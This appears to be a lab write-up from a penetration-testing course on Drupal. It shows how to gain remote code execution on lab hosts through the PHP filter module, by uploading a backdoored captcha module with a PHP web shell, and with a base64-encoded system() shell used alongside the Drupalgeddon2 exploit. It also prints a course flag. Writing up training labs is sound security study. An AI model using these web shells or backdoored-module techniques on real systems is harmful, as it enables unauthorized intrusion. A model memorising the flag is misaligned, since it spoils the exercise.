# [Attacking Drupal](Attacking%20Drupal.md)
### Work through all of the examples in this section and gain RCE multiple ways via the various Drupal instances on the target host. When you are done, submit the contents of the flag.txt file in the /var/www/drupal.inlanefreight.local directory.
#### Leveraging the PHP Filter Module
![](Screenshot%202026-07-29%20at%2012.18.44.png)
![](Screenshot%202026-07-29%20at%2012.22.34.png)

```shell
curl -s http://drupal-qa.inlanefreight.local/node/3?dcfdd5e021a869fcc6dfaef8bf31377e=id | grep uid | cut -f4 -d">"
```
![](Screenshot%202026-07-29%20at%2012.23.28.png)
#### Uploading a Backdoored Module

```shell
wget --no-check-certificate https://ftp.drupal.org/files/projects/captcha-8.x-1.2.tar.gz

tar xvf captcha-8.x-1.2.tar.gz
```

Create `PHP shell` and `.htaccess`

```shell
mv shell.php .htaccess captcha

tar cvf captcha.tar.gz captcha/
```

```shell
curl -s http://drupal.inlanefreight.local/modules/captcha/shell.php?fe8edbabc5c5c9b7b764504cd22b17af=cd%20%2Fvar%2Fwww%2Fdrupal%2Einlanefreight%2Elocal%20%26%26%20cat%20flag%5F6470e394cbf6dab6a91682cc8585059b%2Etxt

DrUp@l_drUp@l_3veryWh3Re!
```
#### Drupalgeddon2

```shell
searchsploit -m /usr/share/exploitdb/exploits/php/webapps/44448.py
```

```shell
echo '<?php system($_GET[fe8edbabc5c5c9b7b764504cd22b17af]);?>' | base64

PD9waHAgc3lzdGVtKCRfR0VUW2ZlOGVkYmFiYzVjNWM5YjdiNzY0NTA0Y2QyMmIxN2FmXSk7Pz4K
```

```shell
echo "PD9waHAgc3lzdGVtKCRfR0VUW2ZlOGVkYmFiYzVjNWM5YjdiNzY0NTA0Y2QyMmIxN2FmXSk7Pz4K" | base64 -d | tee mrb3n.php
<?php system($_GET[fe8edbabc5c5c9b7b764504cd22b17af]);?>
```

```shell
python3 44448.py 
################################################################
# Proof-Of-Concept for CVE-2018-7600
# by Vitalii Rudnykh
# Thanks by AlbinoDrought, RicterZ, FindYanot, CostelSalanders
# https://github.com/a2u/CVE-2018-7600
################################################################
Provided only for educational or information purposes

Enter target url (example: https://domain.ltd/): http://drupal-qa.inlanefreight.local/
Not exploitable
```
